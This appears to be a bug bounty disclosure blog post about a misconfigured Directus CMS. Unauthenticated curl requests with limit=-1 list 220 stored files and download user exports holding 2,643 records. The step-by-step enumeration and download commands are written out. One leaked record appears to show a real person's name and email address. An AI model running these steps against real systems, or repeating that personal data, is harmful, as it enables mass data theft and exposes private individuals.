---
title: "2,643 Users Exposed: The Hidden Cost of a Forgotten Permission"
date: "2026-06-15"
tags: ["CMS", "Directus", "Unauth-API", "PII"]
excerpt: "A misconfigured public role permission on a Directus CMS endpoint leaked 2,643 user records, 964 internal employee emails, and a complete partner ecosystem map — no auth required."
---
![Directus CMS Data Exposure Banner](/images/directus-banner.png)


I was grinding through subdomain enumeration on a bug bounty target when I found a Directus CMS instance with a permission that should've never been granted. One `curl` later, I had 220 files. 33 of them were database exports. 2,643 user records. No authentication.

This is how it happened.

## Finding the CMS

Normal recon flow — subfinder, chaos dataset, httpx for live hosts. One subdomain came back running Next.js on the frontend. I crawled it with katana and the JS crawl pulled out paths I recognized:

```
/cms/auth/login
/cms/collections
/cms/files
/cms/graphql
```

That `/cms/` prefix with those endpoint names is a Directus fingerprint. If you've seen Directus before, you know what to check next.

## Confirming It's Directus (and Already Leaking)

```bash
curl -s https://subdomain.target.com/cms/server/info | jq .
```

Project name and version came back without auth. Not a good sign.

Then I hit the files endpoint with `limit=-1`, which in Directus means "give me everything, no pagination":

```bash
curl -s "https://subdomain.target.com/cms/files?limit=-1" | jq '.data | length'
```

**220.**

Two hundred and twenty files listed without sending a single cookie or token.

Scrolling through the filenames:

```
export-directus_users-20230614-115630.json
export-directus_users-20230517-142230.json
export-directus_users-20230606-92952.json
export-directus_users-20230529-14233.json
export-directus_users-20230524-134750.json
```

Five full user table dumps. Sitting in public storage. The filenames include timestamps — these go back months. Nobody noticed.

## Why This Works

Directus has a public role that controls what unauthenticated users can access. By default, it can't do anything. But someone granted READ on `directus_files` — probably during development so frontend images would load without auth. The problem is `directus_files` is a flat collection. It doesn't separate a hero image from a database dump. If you grant READ on it, you grant READ on everything the CMS stores.

And `limit=-1`? Directus strips the pagination clause from the SQL query when it sees that value. No server-side cap. The database returns every row the permission check passes. One request, full dataset.

## Pulling the Exports

Files in Directus are served by UUID at `/cms/assets/{uuid}`. I filtered for the user exports:

```bash
curl -s "https://subdomain.target.com/cms/files?limit=-1&fields=id,filename_download,filesize" \
  | python3 -c "
import json,sys
data=json.load(sys.stdin)['data']
for f in data:
    if 'directus_users' in f.get('filename_download',''):
        print(f['id'], '|', f['filename_download'], '|', f['filesize'], 'bytes')
"
```

Output:

```
<uuid-1> | export-directus_users-20230614-115630.json | 1344099 bytes
<uuid-2> | export-directus_users-20230517-142230.json | 1234796 bytes
<uuid-3> | export-directus_users-20230606-92952.json  | 1313129 bytes
<uuid-4> | export-directus_users-20230529-14233.json  | 1283870 bytes
<uuid-5> | export-directus_users-20230524-134750.json | 1269377 bytes
```

Downloaded the largest one (1.3MB) and checked the first record:

```bash
curl -s "https://subdomain.target.com/cms/assets/<uuid>" \
  | python3 -c "
import json,sys
data=json.load(sys.stdin)
print(f'Total records: {len(data)}')
print(json.dumps(data[0], indent=2))
"
```

**2,643 records.** First record:

```json
{
  "first_name": "hao",
  "last_name": "tao",
  "email": "1016026583@qq.com",
  "password": null,
  "status": "active",
  "role": "<role-uuid>",
  "id": "<user-uuid>",
  "external_identifier": "RHNUL65VRVJF",
  "subscription": "Standard"
}
```

Production data. Not test accounts.

## What Was Actually in There

Here's exactly what the export contained — I ran these counts directly against the JSON:

**964 internal corporate employee emails.** Filtered from the 2,643 records:

```bash
curl -s "https://subdomain.target.com/cms/assets/<uuid>" \
  | python3 -c "
import json,sys
data=json.load(sys.stdin)
corp=[r['email'] for r in data if '@company.com' in r.get('email','').lower()]
print(f'Internal emails: {len(corp)}')
"
```

Output: `Internal emails: 964`

Breaking down the 2,643 unique users from the largest export:
- 964 were internal company employees (@company.com)
- 1,266 were partner company employees
- 345 used generic email providers (gmail, hotmail, etc.)
- 68 were from government, education, or military domains

Four accounts held the admin role. Two of them were vendor accounts from a third-party development firm. One of those was `test@test.com` — a dev throwaway sitting in production with full CMS admin privileges.

I won't name the individuals or the vendor firm. The point stands either way — a third-party dev account with a disposable email had admin access to a production CMS holding thousands of user records.

## The Plans

13 plan export files, up to 9.3MB each. 4,422 business assessment plans:

```bash
curl -s "https://subdomain.target.com/cms/assets/<uuid>" \
  | python3 -c "
import json,sys
data=json.load(sys.stdin)
print(f'Total plans: {len(data)}')
"
```

Output: `Total plans: 4422`

Each plan had industry selections, product preferences, `user_created` UUIDs, and `shared_with` relationships. The `user_created` field maps directly to user IDs in the user exports. Cross-reference them and you can see which employee works with which partner, what products they're evaluating, who they've shared plans with.

That's a complete business relationship graph built from two JSON files.

## The Whole Chain

```
subfinder + chaos → live subdomain
  → katana JS crawl → /cms/* endpoints
    → /cms/server/info → version + config leaked
      → /cms/files?limit=-1 → 220 files listed
        → /cms/assets/{uuid} → 33 exports downloaded
          → 2,643 users, 964 internal emails, 4 admins
            → plans UUID cross-reference → relationship graph
              → vendor admins + public /cms/admin/ → CMS takeover path
```

Maybe 10 minutes from finding the subdomain to having 2,643 records on disk.

## Credit

I'd been reading **@4osp3l**'s writeup on [breaking Directus CMS](https://4osp3l.blogspot.com/2026/03/breaking-directus-cms-1193-from.html) the week before. His research on `/files` enumeration is what made me check this endpoint. If you hunt Directus instances, read his stuff first.

## What to Take From This

**`limit=-1` on Directus file endpoints.** Always test this. It bypasses pagination and returns everything.

**Export files are forgotten PII bombs.** Devs create them for migrations and backups, upload them to the CMS, then never clean them up. The timestamps on these exports went back months. Nobody noticed.

**Check admin role UUIDs.** The user export had role fields for every account. I filtered for the admin role UUID and found vendor accounts that shouldn't have been there. If you get a user dump, don't just count records — look at who has admin access.

**Cross-reference your exports.** The user records and plan records were separate files, but the UUIDs linked them. Two exports that look harmless alone become a relationship graph together.

## Timeline

- **2026-03-27** — Reported
- **2026-03-29** — Triaged
- **2026-04-08** — Resolved